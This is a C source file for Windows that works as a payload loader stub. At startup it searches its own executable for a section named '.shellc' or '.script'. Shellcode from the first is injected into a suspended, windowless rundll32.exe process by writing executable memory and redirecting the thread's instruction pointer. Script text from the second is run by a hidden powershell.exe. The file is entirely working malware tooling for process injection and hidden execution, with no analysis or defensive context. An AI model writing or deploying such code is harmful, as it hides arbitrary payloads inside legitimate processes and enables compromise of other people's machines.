#include <stdbool.h>
#include <stdint.h>
#include <windows.h>
#include <processthreadsapi.h>

bool _strcmp(const char* restrict a, const char* restrict b) {
    while (*a != '\0' && *b != '\0'){
        if (*a++ != *b++) 
            break;
    }
    return *a == '\0' && *b == '\0';
}

size_t _strlen(const char* restrict str){
    size_t result = 0;
    while (*str++ != '\0')
        result++;
    return result;
}

void pshExec(void* addr){
    STARTUPINFOA startupInfo = {0};
    PROCESS_INFORMATION	processInfo = {0};
    startupInfo.cb = sizeof(startupInfo);

    size_t sz = _strlen(addr) + 16;
    uint8_t* buf = (uint8_t*)VirtualAlloc(NULL, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    const uint8_t* pshPath = "powershell.exe ";
    const uint8_t* _addr = (char*)addr;
    for (int i = 0; pshPath[i] != '\0'; i++){
        buf[i] = pshPath[i];
    }
    for (int i = 0; _addr[i] != '\0'; i++){
        buf[i + 15] = _addr[i];
    }

    CreateProcessA(NULL, buf, NULL, NULL, FALSE,
                        NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, 
                        NULL, &startupInfo, &processInfo);
    VirtualFree(buf, sz, MEM_DECOMMIT | MEM_RELEASE);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
}

void shellcodeExec(void* addr, size_t sz) {
    STARTUPINFOA startupInfo = {0};
    PROCESS_INFORMATION processInfo = {0};
    CONTEXT threadCxt = {0};

    startupInfo.cb = sizeof(startupInfo);
    threadCxt.ContextFlags = CONTEXT_ALL;

    CreateProcessA(NULL, "rundll32.exe", NULL, NULL, FALSE,
                        CREATE_SUSPENDED | NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, 
                        NULL, &startupInfo, &processInfo);

    GetThreadContext(processInfo.hThread, &threadCxt);
    void* lpBaseAddress = VirtualAllocEx(processInfo.hProcess, 0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processInfo.hProcess, lpBaseAddress, addr, sz, NULL);
    threadCxt.Rip = (DWORD64)lpBaseAddress;
    SetThreadContext(processInfo.hThread, &threadCxt);
    ResumeThread(processInfo.hThread);
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);
}

void _start() {
    static uintptr_t pModAddr = 0;

    if (pModAddr != 0) // Exec only once.
        return;

    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
						| GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
						(LPCTSTR)_start, (HMODULE*)&pModAddr);

    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)(pModAddr);
    IMAGE_NT_HEADERS* pNTHeader = (IMAGE_NT_HEADERS*)(pModAddr + pDosHeader->e_lfanew);
    IMAGE_SECTION_HEADER* pSections = (IMAGE_SECTION_HEADER*)(pNTHeader + 1);

    for (int i = 0; i < pNTHeader->FileHeader.NumberOfSections; i++) {
        if (_strcmp(pSections[i].Name, ".shellc")) {
            shellcodeExec((void*)(pModAddr + pSections[i].VirtualAddress), pSections[i].SizeOfRawData);
            break;
        }
        if (_strcmp(pSections[i].Name, ".script")) {
            pshExec((void*)(pModAddr + pSections[i].VirtualAddress));
            break;
        }
    }
    return;
}
